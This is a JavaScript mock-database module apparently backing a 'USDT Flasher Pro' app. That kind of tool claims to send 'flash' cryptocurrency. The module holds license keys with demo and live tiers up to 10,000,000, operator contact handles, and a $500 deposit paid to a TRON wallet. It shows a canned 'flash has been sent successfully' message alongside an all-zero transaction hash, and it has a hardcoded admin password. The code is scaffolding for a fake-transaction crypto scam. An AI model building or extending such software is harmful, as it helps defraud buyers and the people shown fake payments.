// Import the mock database service
// Note: We're importing directly from the file to avoid ES module issues
const mockLicenseKeys = [
  {
    id: 1,
    key: 'USDT-ABCD-1234-EFGH-5678',
    status: 'active',
    created_at: '2025-01-15T10:30:00.000Z',
    expires_at: '2026-01-15T10:30:00.000Z',
    user: 'test@gmail.com',
    type: 'demo',
    maxAmount: 30
  },
  {
    id: 2,
    key: 'USDT-IJKL-9012-MNOP-3456',
    status: 'active',
    created_at: '2025-02-20T14:45:00.000Z',
    expires_at: '2026-02-20T14:45:00.000Z',
    user: 'live@gmail.com',
    type: 'live',
    maxAmount: 10000000
  },
  {
    id: 3,
    key: 'USDT-QRST-7890-UVWX-1234',
    status: 'expired',
    created_at: '2024-03-10T09:15:00.000Z',
    expires_at: '2025-03-10T09:15:00.000Z',
    user: 'test@gmail.com',
    type: 'demo',
    maxAmount: 30
  }
];

const mockContactInfo = {
  primaryPhone: '+447013216​28',
  secondaryPhone: '+14693510740',
  tertiaryPhone: '+91 7823232332',
  email: 'support@usdtflasherpro.com',
  website: 'https://usdtflasherpro.com',
  telegramUsername: '@usdtflasherpro',
  discordServer: 'discord.gg/usdtflasherpro'
};

const mockAppSettings = {
  appVersion: '4.8',
  updateChannel: 'stable',
  autoUpdate: true,
  theme: 'dark',
  accentColor: '#00e6b8',
  animationsEnabled: true,
  sessionTimeout: 30,
  requirePasswordOnStartup: true,
  twoFactorAuth: false,
  defaultNetwork: 'trc20',
  demoMaxFlashAmount: 30,
  liveMaxFlashAmount: 10000000,
  defaultDelayDays: 0,
  defaultDelayMinutes: 0,
  debugMode: false,
  logLevel: 'info',
  apiEndpoint: 'https://api.usdtflasherpro.com/v1',
  // Payment settings
  depositAmount: 500,
  transactionFee: 'Transaction Fee',
  walletAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
  // Success modal settings
  successTitle: 'Success',
  successMessage: 'The flash has been sent successfully',
  transactionHash: '0000000000000000000000000000000000000000000000000000000000000000'
};

// Mock database interface
const mockDb = {
  getLicenseKeys: () => [...mockLicenseKeys],
  getLicenseKey: (id) => {
    const key = mockLicenseKeys.find(k => k.id === id);
    return key ? {...key} : null;
  },
  createLicenseKey: (data) => {
    const newId = mockLicenseKeys.length > 0 ? Math.max(...mockLicenseKeys.map(key => key.id)) + 1 : 1;
    const newKey = { id: newId, ...data };
    mockLicenseKeys.push(newKey);
    return {...newKey};
  },
  updateLicenseKey: (id, data) => {
    const index = mockLicenseKeys.findIndex(k => k.id === id);
    if (index === -1) return null;
    mockLicenseKeys[index] = { ...mockLicenseKeys[index], ...data };
    return {...mockLicenseKeys[index]};
  },
  deleteLicenseKey: (id) => {
    const index = mockLicenseKeys.findIndex(k => k.id === id);
    if (index === -1) return null;
    mockLicenseKeys.splice(index, 1);
    return id;
  },
  getContactInfo: () => ({...mockContactInfo}),
  getAppSettings: () => ({...mockAppSettings}),
  getFlashHistory: () => [],
  authenticateUser: (email, password) => {
    if (email === 'admin@example.com' && password === 'password') {
      return {
        success: true,
        user: {
          id: 1,
          email: 'admin@example.com',
          displayName: 'Admin User',
          role: 'admin'
        }
      };
    }
    return { success: false, message: 'Invalid email or password' };
  }
};

// For development, we'll use the mock database
const USE_MOCK_DATABASE = true;

// License Key functions
function validateLicenseKey(key) {
  try {
    // Get all license keys from the mock database
    const licenseKeys = mockDb.getLicenseKeys();
    
    // Find the license key
    const licenseKey = licenseKeys.find(license => license.key === key);
    
    if (!licenseKey) {
      return { valid: false, message: 'Invalid license key' };
    }
    
    // Check if license key is active
    if (licenseKey.status !== 'active') {
      return { valid: false, message: `License key is ${licenseKey.status}` };
    }
    
    // Check if license key has expired
    const expiryDate = new Date(licenseKey.expires_at || licenseKey.expiresAt);
    if (expiryDate < new Date()) {
      return { valid: false, message: 'License key has expired' };
    }
    
    // Determine license type and user
    const isDemo = licenseKey.type === 'demo' || key === 'USDT-ABCD-1234-EFGH-5678';
    const user = isDemo ? 'test@gmail.com' : 'live@gmail.com';
    const type = isDemo ? 'demo' : 'live';
    const maxAmount = isDemo ? mockAppSettings.demoMaxFlashAmount : mockAppSettings.liveMaxFlashAmount;
    
    // Add license type and user to the response
    licenseKey.type = type;
    licenseKey.user = user;
    licenseKey.maxAmount = maxAmount;
    
    return { valid: true, licenseKey };
  } catch (error) {
    console.error('Error validating license key with mock database:', error);
    return { valid: false, message: 'Error validating license key. Please try again.' };
  }
}

// Contact Information functions
function getContactInfo() {
  try {
    return mockDb.getContactInfo();
  } catch (error) {
    console.error('Error getting contact info from mock database:', error);
    throw error;
  }
}

function updateContactInfo(contactData) {
  try {
    // This is a mock implementation
    return contactData;
  } catch (error) {
    console.error('Error updating contact info:', error);
    throw error;
  }
}

function getContactInfoHistory(limit = 10) {
  try {
    // This is a mock implementation
    return mockDb.getContactInfoHistory ? mockDb.getContactInfoHistory(limit) : [];
  } catch (error) {
    console.error('Error getting contact info history:', error);
    return [];
  }
}

// App Settings functions
function getAppSettings() {
  try {
    return mockDb.getAppSettings();
  } catch (error) {
    console.error('Error getting app settings from mock database:', error);
    throw error;
  }
}

function updateAppSettings(settingsData) {
  try {
    // This is a mock implementation
    return settingsData;
  } catch (error) {
    console.error('Error updating app settings:', error);
    throw error;
  }
}

// Flash Transaction functions
function logFlashTransaction(transactionData) {
  try {
    // For mock database, we'll just return a success response
    return { success: true, id: Date.now() };
  } catch (error) {
    console.error('Error logging flash transaction:', error);
    return { success: false, error: error.message };
  }
}

function getFlashHistory(licenseKeyId) {
  try {
    return mockDb.getFlashHistory ? mockDb.getFlashHistory(licenseKeyId) : [];
  } catch (error) {
    console.error('Error getting flash history from mock database:', error);
    return [];
  }
}

// User Authentication functions
function authenticateUser(email, password) {
  try {
    return mockDb.authenticateUser(email, password);
  } catch (error) {
    console.error('Error authenticating user with mock database:', error);
    return { success: false, message: 'Authentication error' };
  }
}

// Export functions
module.exports = {
  validateLicenseKey,
  getLicenseKeys: () => mockDb.getLicenseKeys(),
  getLicenseKey: (id) => mockDb.getLicenseKey(id),
  createLicenseKey: (data) => mockDb.createLicenseKey(data),
  updateLicenseKey: (id, data) => mockDb.updateLicenseKey(id, data),
  deleteLicenseKey: (id) => mockDb.deleteLicenseKey(id),
  getContactInfo,
  updateContactInfo,
  getContactInfoHistory,
  getAppSettings,
  updateAppSettings,
  logFlashTransaction,
  getFlashHistory,
  authenticateUser
};
